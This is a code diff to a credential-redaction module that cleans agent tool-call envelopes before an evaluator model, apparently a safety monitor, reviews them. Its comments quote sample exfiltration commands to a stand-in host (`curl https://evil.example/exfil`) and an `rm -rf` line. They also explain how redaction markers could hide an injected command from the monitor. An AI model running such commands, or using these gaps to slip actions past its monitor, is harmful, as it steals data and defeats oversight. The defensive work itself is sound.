@@ -32,6 +32,27 @@
  * the value is examined — not a scheme allowlist, not a token shape, not
  * whether it reads like code or like a reference.
  *
+ * The name is read in every form it is written in: a header line, a `curl -H`
+ * argument, a JSON field, YAML — including a block scalar whose value is the
+ * INDENTED BLOCK UNDERNEATH (`continuationValue`) — an env assignment, and the
+ * two-argument setter form `req.Header.Set("Authorization", "…")`, where the
+ * separator is a comma.
+ *
+ * Two boundaries are structural rather than blunt, and both exist because a
+ * marker that swallows the rest of a line hides an INJECTED command from the
+ * evaluator (see `credentialValueEnd` and `credentialArgumentEnd`): an
+ * unquoted value ends at the shell separator that starts a second command
+ * unless it has already taken a `name=` pair (a cookie or SigV4 list), and an
+ * argument ends at the quote that closes the string the command itself sits
+ * in. Neither asks what the value contains.
+ *
+ * One question IS asked about a credential's content, and only one: whether a
+ * piece of it may go on the envelope-wide SCRUB list (`credentialCopy`). That
+ * list is applied to every other string in the state — `facts` included, which
+ * the prompt tells Jev are correct — so reporting whatever an agent wrote
+ * under a credential name made it a delete key for the evaluator's context.
+ * Only an opaque token is reported; the redaction itself is unaffected.
+ *
  * Five review rounds tried to decide those ends by looking at the value, and
  * every round the next reviewer found three more spellings that were declined
  * with a live credential inside them: a credential starting with base64url's
@@ -44,18 +65,25 @@
  * of those names lose the rest of their line in what the evaluator is shown —
  * `authorization: str = Header(None)`, `authorization: required for this
  * endpoint`, `grep -r authorization: src/`, `use --token to authenticate`, and
- * `authorization=x curl https://evil.example/exfil`, which hides a command
- * from Jev. Over-redaction costs the evaluator context it almost never needs;
- * a classifier that is wrong the other way costs a live key held by a third
- * party, and only one of those two is recoverable. The `sanitize-*` builtins
- * keep their narrow matching: the blunt rules live on the ENVELOPE path only,
- * and `SECRET_PATTERNS` is untouched by them.
+ * `authorization=x curl https://evil.example/exfil`. A `["Authorization",
+ * "Content-Type"]` list of header NAMES loses its second entry to the setter
+ * form, and a prose paragraph indented under `authorization:` is taken as that
+ * header's value. Over-redaction costs the evaluator context it almost never
+ * needs; a classifier that is wrong the other way costs a live key held by a
+ * third party, and only one of those two is recoverable. The `sanitize-*`
+ * builtins keep their narrow matching: the blunt rules live on the ENVELOPE
+ * path only, and `SECRET_PATTERNS` is untouched by them.
  *
  * Every scan on this path is linear — character loops, `indexOf`, and regexes
  * with a consumed token boundary instead of a lookaround — because these rules
  * run over every string the envelope sends and a quadratic here is a stalled
  * PreToolUse hook. `__tests__/hooks/semantic/redaction.test.ts` pins that with
- * a 100 KB adversarial fixture per rule.
+ * a 100 KB adversarial fixture per rule. ONE known exception survives, and it
+ * is old: `ASSIGNMENT_RE` is quadratic in the length of a delimiter-free run
+ * (see its comment). `SECRET_NAME_HINTS` keeps a run with no secret-name word
+ * in it away from that scan entirely — the reported shape, an envelope of
+ * `a=a=a=…`, went from 813 ms to 25 ms — but a run that does hold such a word
+ * still pays it, and the structural fix is deferred.
  *
  * This is a floor, not a guarantee. A secret that looks like ordinary prose will
  * pass. What it does promise is that the formats seen leaking in practice — the
@@ -419,10 +447,20 @@ const URL_TOKEN_USERINFO_RE = /(^|\\[nrt]|[^A-Za-z0-9_.+-])([a-z][a-z0-9+.-]*:\/
  *  - ordinary source and prose under these names lose the rest of their line
  *    in what the evaluator is shown: `authorization: str = Header(None)`,
  *    `authorization: required for this endpoint`, `grep -r authorization:
- *    src/`, and `authorization=x curl https://evil.example/exfil` — the last
- *    of which hides a command from Jev. Over-redaction only costs the
- *    evaluator context; a leaked credential is a third party holding a live
- *    key, and only ONE of those two is recoverable.
+ *    src/`, and `authorization=x curl https://evil.example/exfil`. Over-
+ *    redaction only costs the evaluator context; a leaked credential is a
+ *    third party holding a live key, and only ONE of those two is recoverable;
+ *  - a paragraph indented under `authorization:` is read as that header's
+ *    value (`continuationValue`), because in YAML that is exactly what it is;
+ *  - a LIST of header names loses everything after the first: `["Authorization",
+ *    "Content-Type"]` reads as the setter form, name then value.
+ *
+ * The one place the rule stops short of the end of the line is an UNQUOTED
+ * value at a shell separator that starts a second command — see
+ * `credentialValueEnd`. That is not a judgement about the value: it is where
+ * the shell itself stopped passing bytes to the header, and taking the rest
+ * hid an injected `&& curl https://evil.example/exfil` from the evaluator
+ * behind a marker that read as handled.
  *
  * Only the HTTP spellings of the API-key and cookie names are included
  * (`api-key`, `x-api-key`, `cookie`, `set-cookie`). The code spellings
@@ -438,9 +476,20 @@ const CREDENTIAL_HEADER_NAMES = String.raw`(?:x-|proxy-|set-)?(?:authorization|a
  * makes every position inside a token fail in one step. `\n`, `\r` and `\t`
  * count because input nested two levels deep is JSON-stringified, where a
  * header at the start of a line follows the two characters `\` `n`.
+ *
+ * Two separator shapes, because a header is set in two ways:
+ *
+ *   `Authorization: …`, `authorization=…`, `"Authorization": "…"`  — a separator
+ *   `req.Header.Set("Authorization", "…")`, `headers.set("x-api-key", …)`,
+ *   `xhr.setRequestHeader("Authorization", …)`, `[("x-api-key", "…")]` — a COMMA
+ *
+ * The comma form requires the closing quote of the name, which is what keeps
+ * it off ordinary prose ("the authorization, which expired"): every setter and
+ * every tuple writes the name as a string literal. Both alternatives are
+ * anchored after the name and consume a bounded run, so the scan stays linear.
  */
 const CREDENTIAL_HEADER_RE = new RegExp(
-  String.raw`(^|\\[nrt]|[^A-Za-z0-9_-])(${CREDENTIAL_HEADER_NAMES})(?:\\?["'])?[ \t]*(?::=|[:=])[ \t]*`,
+  String.raw`(^|\\[nrt]|[^A-Za-z0-9_-])(${CREDENTIAL_HEADER_NAMES})(?:(?:\\?["'])?[ \t]*(?::=|[:=])[ \t]*|(?:\\?["'])[ \t]*,[ \t]*)`,
   "gi",
 );
 /** The same names as a whole field name, for structured input. */
@@ -452,6 +501,16 @@ function credentialHeaderLabel(name: string): string {
   if (n.endsWith("cookie")) return "cookie header";
   if (n.endsWith("api-key")) return "api key header";
   return "authorization header";
+}
+
+/**
+ * Whether this header's value can open with a public SCHEME word (`Bearer`,
+ * `AWS4-HMAC-SHA256`). Only `Authorization` and its kin can: a cookie's value
+ * starts with the session pair and an API key header holds the key itself, so
+ * for those the first piece is the credential.
+ */
+function headerHasScheme(name: string): boolean {
+  return credentialHeaderLabel(name) === "authorization header";
 }
 
 /**
@@ -472,7 +531,10 @@ const withoutMarkers = (s: string): string => s.replace(AUTH_MARKER_RE, "");
 function bareArgument(t: string): string {
   const s = t.replace(/[,;]+$/, "");
   const m = /^(["'])([\s\S]*)\1$/.exec(s);
-  return m ? m[2] : s;
+  // A quote with no partner inside the token belongs to the code AROUND it —
+  // `app --password <tok>"` ends at a quote nothing opened — and leaving it on
+  // means the secret reported for the scrub pass matches no copy of itself.
+  return m ? m[2] : s.replace(/^["']|["']$/g, "");
 }
 
 /** Where the scan has got to, and the quote that is open there. */
@@ -556,15 +618,39 @@ function quoteClosesValue(text: string, at: number, close: string): boolean {
 
 /**
  * Where a credential header's value ends: the closing quote when it is inside
- * one, otherwise the end of the line. A character loop, so a 100 KB line costs
- * 100 KB of work and no regex can backtrack over it.
+ * one, otherwise the end of the line — or, for an UNQUOTED value, the shell
+ * separator that starts a second command.
+ *
+ * The separator rule is not a judgement about the value, it is where the shell
+ * itself would have stopped passing bytes to the header: `echo cookie: && curl
+ * https://evil.example/exfil` writes a credential NAME and then a SEPARATE
+ * command, and taking the rest of the line put that command behind a marker —
+ * a seven-character prefix hid an exfiltration from the evaluator while the
+ * count still read `redactions: 1`.
+ *
+ * The one credential value that legitimately holds a separator is a parameter
+ * list: `Cookie: a=1; sid=…` and `Authorization: AWS4-HMAC-SHA256
+ * Credential=…, SignedHeaders=content-type;host, Signature=…`, both of which
+ * are written unquoted in a raw HTTP file or a log. So a value that has
+ * already taken a `name=` pair keeps going through `;`, `&` and `|`; `&&` and
+ * `||` are two commands in every spelling and always end it.
+ *
+ * A character loop, so a 100 KB line costs 100 KB of work and no regex can
+ * backtrack over it.
  */
 function credentialValueEnd(text: string, start: number, close: string | null): number {
   let i = start;
+  let sawPair = false;
   while (i < text.length) {
     const c = text[i];
     if (c === "\n" || c === "\r") return i;
-    if (close !== null && text.startsWith(close, i) && quoteClosesValue(text, i, close)) return i;
+    if (close !== null) {
+      if (text.startsWith(close, i) && quoteClosesValue(text, i, close)) return i;
+    } else if (c === ";" || c === "&" || c === "|") {
+      if (!sawPair || ((c === "&" || c === "|") && text[i + 1] === c)) return i;
+    } else if (c === "=" && i > start) {
+      sawPair = true;
+    }
     if (c === "\\") {
       const n = text[i + 1];
       if (n === "n" || n === "r") return i;
@@ -576,38 +662,174 @@ function credentialValueEnd(text: string, start: number, close: string | null): 
   return text.length;
 }
 
+/** A line break at `i`: a real one, or the JSON escape of one. 0 when there is none. */
+function lineBreakLength(text: string, i: number): number {
+  const c = text[i];
+  if (c === "\n") return 1;
+  if (c === "\r") return text[i + 1] === "\n" ? 2 : 1;
+  if (c === "\\" && (text[i + 1] === "n" || text[i + 1] === "r")) return 2;
+  return 0;
+}
+
+/** Where the line holding `pos` starts, real breaks and JSON-escaped ones alike. */
+function lineStartBefore(text: string, pos: number): number {
+  for (let i = pos - 1; i >= 0; i--) {
+    const c = text[i];
+    if (c === "\n" || c === "\r") return i + 1;
+    if ((c === "n" || c === "r") && i > 0 && text[i - 1] === "\\") return i + 1;
+  }
+  return 0;
+}
+
+/** Where the line holding `at` ends. */
+function lineEnd(text: string, at: number): number {
+  let i = at;
+  while (i < text.length && lineBreakLength(text, i) === 0) i++;
+  return i;
+}
+
+/** How many spaces or tabs `at` opens with. */
+function indentAt(text: string, at: number): number {
+  let n = 0;
+  while (text[at + n] === " " || text[at + n] === "\t") n++;
+  return n;
+}
+
+/**
+ * A YAML block or folded scalar indicator (`|`, `>-`, `|+2`) that is the whole
+ * rest of the line: the value is the block indented underneath it. Read in
+ * code and in one bounded step, because an indicator is at most four
+ * characters and slicing the rest of the line per header is not linear.
+ * Returns where the indicator's line ends, or -1.
+ */
+function blockIndicatorEnd(text: string, at: number): number {
+  const c = text[at];
+  if (c !== "|" && c !== ">") return -1;
+  let i = at + 1;
+  if (text[i] === "+" || text[i] === "-") i++;
+  while (text[i] >= "0" && text[i] <= "9") i++;
+  while (text[i] === " " || text[i] === "\t") i++;
+  return i >= text.length || lineBreakLength(text, i) > 0 ? i : -1;
+}
+
+/**
+ * The value of a header whose own line holds nothing but the name — a folded
+ * HTTP header, a line-broken JSON object, and above all a YAML block scalar
+ * (`authorization: >-`), the one format where a credential legitimately sits on
+ * its own line. Redacting the indicator and leaving the credential underneath
+ * it was worse than not matching at all: the count read as handled.
+ *
+ * The value is every following line indented DEEPER than the header's own — the
+ * YAML rule, and the same shape as an HTTP continuation line and a line-broken
+ * dict. A first line that opens with a quote ends at that quote instead, so
+ * `{"Authorization":\n  "…"}` keeps its quotes.
+ *
+ * Reached only when the rest of the header's line is blank or a block
+ * indicator, which at most one header per line can be, so the walk back to the
+ * line start costs one pass over that line and the scan stays linear.
+ */
+function continuationValue(text: string, headerAt: number, from: number): { start: number; end: number } | null {
+  // Cheap test first: only a value that runs to a line break can continue on
+  // the next one, and at most one header per line does, so the walk back to
+  // the line start below costs one pass over that line and no more.
+  if (lineBreakLength(text, from) === 0) return null;
+  const indent = indentAt(text, lineStartBefore(text, headerAt));
+  let start = -1;
+  let end = -1;
+  let i = from;
+  for (;;) {
+    const b = lineBreakLength(text, i);
+    if (b === 0) break;
+    const lineAt = i + b;
+    const ind = indentAt(text, lineAt);
+    const contentAt = lineAt + ind;
+    if (contentAt >= text.length || ind <= indent || lineBreakLength(text, contentAt) > 0) break;
+    if (start < 0) {
+      // A quoted first line is the whole value: `"HMAC …"` on its own line.
+      const q = text[contentAt];
+      const escaped = q === "\\" && (text[contentAt + 1] === '"' || text[contentAt + 1] === "'");
+      if (q === '"' || q === "'" || escaped) {
+        const close = escaped ? text.slice(contentAt, contentAt + 2) : q;
+        const inner = contentAt + close.length;
+        return { start: inner, end: credentialValueEnd(text, inner, close) };
+      }
+      start = contentAt;
+    }
+    i = lineEnd(text, contentAt);
+    end = i;
+  }
+  return start < 0 || end <= start ? null : { start, end };
+}
+
+/** A path, a URL or a shell/template reference — never a credential's own text. */
+const NOT_A_CREDENTIAL_RE = /^[/~$`{(<[%]|^\.{1,2}\//;
+
+/**
+ * `piece` as a COPY of the credential just redacted, or null.
+ *
+ * This is the ONE question this file asks about a credential's content, and it
+ * decides the SCRUB LIST, never the redaction: the value is replaced on the
+ * strength of its NAME whatever this returns.
+ *
+ * It has to be asked, because `scrubKnownSecrets` deletes what it is given from
+ * every other string in the envelope — from `facts`, which the prompt tells Jev
+ * are "correct", and from the human's own words. The blunt rules above redact
+ * whatever an agent writes under a credential name, so a path, a second command
+ * or an English sentence lands here just as readily as a token, and reporting
+ * those made the scrub list an attacker-writable delete key: `echo cookie: ;
+ * rm -rf /home/u/build` reported `rm`, `-rf` and the path, and the path then
+ * vanished from `facts.paths` and from `user_said`.
+ *
+ * So only an opaque token qualifies: no whitespace, eight characters or more,
+ * a shape a word does not have, and not a path, a URL, a reference or one of
+ * this file's own markers. A credential that fails the test is still redacted
+ * where it was written; only the scrub of its copies elsewhere is given up, and
+ * a copy that reaches Jev anyway is one with no credential context around it.
+ */
+function credentialCopy(piece: string): string | null {
+  const s = bareArgument(piece);
+  if (s.length < 8 || /\s/.test(s)) return null;
+  if (s.includes("<") || s.includes(">")) return null; // a marker, or a `<placeholder>`
+  if (NOT_A_CREDENTIAL_RE.test(s) || s.includes("://")) return null;
+  if (s.includes("/") && s.length < 32) return null; // a path; a base64 blob is longer
+  return tokenLike(s) ? s : null;
+}
+
 /**
  * What of a redacted header value to hand `scrubKnownSecrets`, which replaces
  * every copy of it in the REST of the envelope.
  *
- * Only text that was actually redacted as a credential may go on that list.
- * Two exclusions do all the work, and neither of them looks at what a token
- * contains:
+ * Only text that was actually redacted as a credential may go on that list, so
+ * every piece goes through `credentialCopy`, and two structural exclusions come
+ * first:
  *
  *  - a region holding a marker reports nothing. Whatever was secret in it was
  *    already found and reported by the earlier rule that wrote the marker, and
  *    splitting the rest on whitespace produced fragments of the MARKER —
  *    `<redacted:OpenAI` is sixteen characters, so `scrubKnownSecrets` accepted
  *    it and mangled every other marker in the envelope.
- *  - the first piece of a multi-piece value is dropped. That position is the
- *    only one a public scheme name can occupy (`Bearer`, `AWS4-HMAC-SHA256`,
- *    `Hawk`, `NTLM`), and `AWS4-HMAC-SHA256` is exactly sixteen characters too:
- *    reporting it deleted the human's own words from `user_said`. A value of
- *    ONE piece has no scheme in front of it and is reported whole.
+ *  - where the header HAS a scheme position, the first piece of a multi-piece
+ *    value is dropped: `Bearer`, `AWS4-HMAC-SHA256`, `Hawk`, `NTLM` are public,
+ *    and `AWS4-HMAC-SHA256` is exactly sixteen characters, so reporting it
+ *    deleted the human's own words from `user_said`. A piece with an `=` in it
+ *    is never a scheme, and `Cookie`/`x-api-key` have no scheme position at
+ *    all — their credential IS the first piece (`sid=…`), which round 6 dropped
+ *    while scrubbing the public `theme=dark` next to it envelope-wide.
+ *
+ * A `name=value` piece reports its VALUE rather than the pair: the value is the
+ * credential, and a copy written as `sid=<value>` loses it too, because the
+ * scrub replaces substrings. That is what keeps `theme=dark` off the list.
  */
-function credentialRegionSecrets(region: string): string[] {
+function credentialCopies(region: string, hasScheme: boolean): string[] {
   if (region.includes(AUTH_MARKER_HEAD)) return [];
   const pieces = region.split(/\s+/).filter(Boolean);
   const out: string[] = [];
-  const push = (s: string): void => {
-    const b = bareArgument(s);
-    if (b && !out.includes(b)) out.push(b);
-  };
-  for (const piece of pieces.length === 1 ? pieces : pieces.slice(1)) {
-    push(piece);
-    // `Signature=<value>`: the bare value travels on its own elsewhere.
-    const param = /^[A-Za-z][A-Za-z0-9_.-]*=([\s\S]+)$/.exec(bareArgument(piece));
-    if (param) push(param[1]);
+  for (let i = 0; i < pieces.length; i++) {
+    const piece = bareArgument(pieces[i]);
+    if (i === 0 && hasScheme && pieces.length > 1 && !piece.includes("=")) continue;
+    const eq = piece.indexOf("=");
+    const copy = credentialCopy(eq > 0 ? piece.slice(eq + 1) : piece);
+    if (copy !== null && !out.includes(copy)) out.push(copy);
   }
   return out;
 }
@@ -634,14 +856,24 @@ function redactCredentialHeaders(text: string, counter: { n: number; found: stri
         start = valueAt + 2;
       }
     }
-    const end = credentialValueEnd(text, start, close);
-    const region = text.slice(start, end);
+    let end = credentialValueEnd(text, start, close);
+    let region = text.slice(start, end);
+    // Nothing on this line but the name, or a YAML block indicator: the value
+    // is the block indented underneath.
+    const indicator = close === null ? blockIndicatorEnd(text, start) : -1;
+    if (indicator >= 0 || withoutMarkers(region).trim() === "") {
+      const cont = continuationValue(text, m.index, indicator >= 0 ? indicator : end);
+      if (cont === null) continue;
+      start = cont.start;
+      end = cont.end;
+      region = text.slice(start, end);
+    }
     // Nothing left to take: an empty value, or one an earlier rule already
     // replaced whole — which is what makes a second pass a no-op.
     if (withoutMarkers(region).trim() === "") continue;
     out += text.slice(last, start) + marker(credentialHeaderLabel(m[2]));
     counter.n++;
-    for (const s of credentialRegionSecrets(region)) counter.found.push(s);
+    for (const s of credentialCopies(region, headerHasScheme(m[2]))) counter.found.push(s);
     last = end;
     CREDENTIAL_HEADER_RE.lastIndex = end;
   }
@@ -773,10 +1005,22 @@ const GATING_WORDS: ReadonlyArray<string> = [
   ]),
 ];
 
-/** Where the one command-line argument that starts at `start` ends. */
-function credentialArgumentEnd(text: string, start: number): { from: number; to: number } {
+/**
+ * Where the one command-line argument that starts at `start` ends.
+ *
+ * `close` is the quote the COMMAND itself sits inside, carried forward by the
+ * same cursor the header path uses. It is what ends the argument in the
+ * commonest MCP shape of all — `{"command": "app --password pw"}` — where the
+ * `"` belongs to the JSON around the command, not to the value: swallowing it
+ * put `pw"}` on the scrub list, so the bare copy of that credential elsewhere
+ * in the envelope no longer matched and went out to Jev, and it cost the text
+ * Jev was shown its closing quote.
+ */
+function credentialArgumentEnd(text: string, start: number, close: string | null): { from: number; to: number } {
+  // A quote of the value's own: `--password 'pw'`. Inside an enclosing string
+  // the same character is that string's end, not an opening quote.
   const q = text[start];
-  if (q === '"' || q === "'") {
+  if (close === null && (q === '"' || q === "'")) {
     for (let i = start + 1; i < text.length; i++) {
       const c = text[i];
       if (c === "\n" || c === "\r") break;
@@ -786,6 +1030,7 @@ function credentialArgumentEnd(text: string, start: number): { from: number; to:
   let i = start;
   while (i < text.length) {
     const c = text[i];
+    if (close !== null && text.startsWith(close, i)) break;
     // A marker an earlier rule wrote has spaces in it and is one unit.
     if (c === "<" && text.startsWith(AUTH_MARKER_HEAD, i)) {
       const closed = text.indexOf(">", i);
@@ -835,6 +1080,8 @@ function credentialValueStart(text: string, flagEnd: number, attached: boolean):
 function redactCredentialArguments(text: string, counter: { n: number; found: string[] }): string {
   let out = "";
   let last = 0;
+  // The quote the command itself sits inside, carried forward in one pass.
+  const cur: QuoteCursor = { pos: 0, open: null };
   // Lowercased once per string, and only when a gated flag is actually met.
   let lower: string | null = null;
   let present: ReadonlySet<string> | null = null;
@@ -882,14 +1129,16 @@ function redactCredentialArguments(text: string, counter: { n: number; found: st
     if (flagEnd < 0) continue;
     let start = credentialValueStart(text, flagEnd, attached);
     if (start < 0) continue;
-    let arg = credentialArgumentEnd(text, start);
+    if (cur.pos < start) advanceQuotes(text, cur, start);
+    const close = cur.open;
+    let arg = credentialArgumentEnd(text, start, close);
     if (basicAuth) {
       // `-u user:pass`: only what follows the FIRST colon is the credential.
       const colon = text.indexOf(":", arg.from);
       if (colon < 0 || colon >= arg.to) continue;
       start = colon + 1;
       const inner = text[start];
-      arg = inner === '"' || inner === "'" ? credentialArgumentEnd(text, start) : { from: start, to: arg.to };
+      arg = close === null && (inner === '"' || inner === "'") ? credentialArgumentEnd(text, start, close) : { from: start, to: arg.to };
     }
     if (arg.to <= arg.from) continue;
     const value = text.slice(arg.from, arg.to);
@@ -897,7 +1146,11 @@ function redactCredentialArguments(text: string, counter: { n: number; found: st
     if (withoutMarkers(value).trim() === "") continue;
     out += text.slice(last, arg.from) + marker(label);
     counter.n++;
-    counter.found.push(value);
+    // Only the bare credential goes on the scrub list, and only when it could
+    // be one: this rule redacts on the FLAG alone, so `git commit -am "fix
+    // --token parsing"` lands here too.
+    const copy = credentialCopy(value);
+    if (copy !== null) counter.found.push(copy);
     last = arg.to;
     FLAG_TOKEN_RE.lastIndex = arg.to;
   }
@@ -1067,6 +1320,32 @@ export function secretNameStrength(name: string): "strong" | "weak" | null {
   return null;
 }
 
+/**
+ * A linear pre-filter for the three name-driven scans: whether any name in
+ * `text` could be a secret name at all.
+ *
+ * `secretNameStrength` says yes only to a name that holds one of its own words,
+ * so a string holding none of them has nothing for those scans to find. The
+ * list is derived from the sets above — a word added there is covered without
+ * a second edit — and reduced to a minimal cover, because a name holding
+ * `password` holds `pass` too.
+ *
+ * It is also the cheap half of the `ASSIGNMENT_RE` cost problem (see that
+ * rule's comment): an envelope of `a=a=a=…` no longer reaches the quadratic
+ * scan at all, 813 ms → 2 ms. It is NOT a fix for the cost — a run that does
+ * hold one of these words still pays it — and that fix is deferred.
+ */
+const SECRET_NAME_HINTS: ReadonlyArray<string> = (() => {
+  const words = [...new Set([...STRONG_LAST_WORDS, ...WEAK_LAST_WORDS, "token", "code"])];
+  return words.filter((w) => !words.some((other) => other !== w && w.includes(other)));
+})();
+
+function mayHoldSecretName(text: string): boolean {
+  const lower = text.toLowerCase();
+  for (const word of SECRET_NAME_HINTS) if (lower.includes(word)) return true;
+  return false;
+}
+
 // ── Value shapes ─────────────────────────────────────────────────────────────
 
 const NON_VALUE_WORDS = new Set(["true", "false", "null", "none", "nil", "undefined", "yes", "no", "on", "off"]);
@@ -1201,18 +1480,21 @@ export function isSecretFieldValue(name: string, value: string): boolean {
  * scheme, `Hawk`/`NTLM`/`Splunk` pass for prose, and this value never goes
  * through `redactSecrets`, so anything kept here is sent as it stands.
  *
- * Returns the marker and the credential it removed, or null when the field is
- * not a credential header or its value is blank. The reported secret is what
- * `scrubKnownSecrets` looks for in the rest of the envelope, so a value that
- * already holds a marker reports nothing: the earlier rule that wrote that
- * marker reported what was secret in it.
+ * Returns the marker and the credential copies it removed, or null when the
+ * field is not a credential header or its value is blank. `secrets` is what
+ * `scrubKnownSecrets` looks for in the rest of the envelope, so it holds the
+ * BARE credential rather than the whole value: `{"Authorization": "Bearer
+ * <tok>"}` reporting `Bearer <tok>` matched no copy of `<tok>` anywhere, and
+ * the copy the human had pasted into their message went out to Jev. The same
+ * `credentialCopies` as the text path, so a value that is already a marker
+ * reports nothing and a value that is prose reports nothing either.
  */
-export function redactAuthorizationField(name: string, value: string): { text: string; secret: string } | null {
+export function redactAuthorizationField(name: string, value: string): { text: string; secrets: string[] } | null {
   const field = name.trim();
   if (!CREDENTIAL_FIELD_RE.test(field)) return null;
   const v = value.trim();
   if (!v) return null;
-  return { text: marker(credentialHeaderLabel(field)), secret: v.includes(AUTH_MARKER_HEAD) ? "" : v };
+  return { text: marker(credentialHeaderLabel(field)), secrets: credentialCopies(v, headerHasScheme(field)) };
 }
 
 /**
@@ -1404,7 +1686,18 @@ export function redactSecretsDetailed(text: string): RedactedDetail {
 
   // 3. The shared floor.
   for (const [re, label, keepsPrefix] of SHARED_RULES) {
+    const before = c.found.length;
     out = replaceCounting(out, re, (_m, g) => (keepsPrefix ? (g[0] ?? "") : "") + marker(label), c);
+    // A floor entry that takes the header NAME along with the value —
+    // `Authorization: Bearer <tok>` is one match — reports the whole match as
+    // the secret, and that string matches no copy of the credential anywhere
+    // else in the envelope, so the copy the human pasted went out. Report the
+    // credential inside it too, under the same rule as every other region.
+    const end = c.found.length;
+    for (let i = before; i < end; i++) {
+      if (!/\s/.test(c.found[i])) continue;
+      for (const copy of credentialCopies(c.found[i], true)) if (!c.found.includes(copy)) c.found.push(copy);
+    }
   }
 
   // 4. Vendor prefixes and webhook URLs.
@@ -1444,6 +1737,32 @@ export function redactSecretsDetailed(text: string): RedactedDetail {
   // the secret these rules hand to the scrub pass is the BARE value, which is
   // the form its copies elsewhere in the envelope are in.
   out = redactCredentialArguments(out, c);
+
+  out = redactNamedSecrets(out, c);
+
+  // 8. Anything left that looks generated.
+  out = replaceCounting(
+    out,
+    LONG_TOKEN_RE,
+    (m, _g, offset, whole) => (looksRandomToken(m) && !insideDigest(whole, offset) ? marker("high-entropy token") : null),
+    c,
+    "skip",
+  );
+
+  return { text: out, count: c.n, found: c.found };
+}
+
+/**
+ * The three name-driven scans: `config set <name> <value>`, every syntax of
+ * `NAME=value`, and `--flag value`.
+ *
+ * Skipped whole for a string that holds no secret-name word, which is one pass
+ * against three and is what keeps an envelope of `a=a=a=…` off `ASSIGNMENT_RE`'s
+ * quadratic path (813 ms → 2 ms; see `SECRET_NAME_HINTS`).
+ */
+function redactNamedSecrets(text: string, c: { n: number; found: string[] }): string {
+  if (!mayHoldSecretName(text)) return text;
+  let out = text;
   out = replaceCounting(
     out,
     CONFIG_SET_RE,
@@ -1492,15 +1811,5 @@ export function redactSecretsDetailed(text: string): RedactedDetail {
     },
     c,
   );
-
-  // 8. Anything left that looks generated.
-  out = replaceCounting(
-    out,
-    LONG_TOKEN_RE,
-    (m, _g, offset, whole) => (looksRandomToken(m) && !insideDigest(whole, offset) ? marker("high-entropy token") : null),
-    c,
-    "skip",
-  );
-
-  return { text: out, count: c.n, found: c.found };
+  return out;
 }
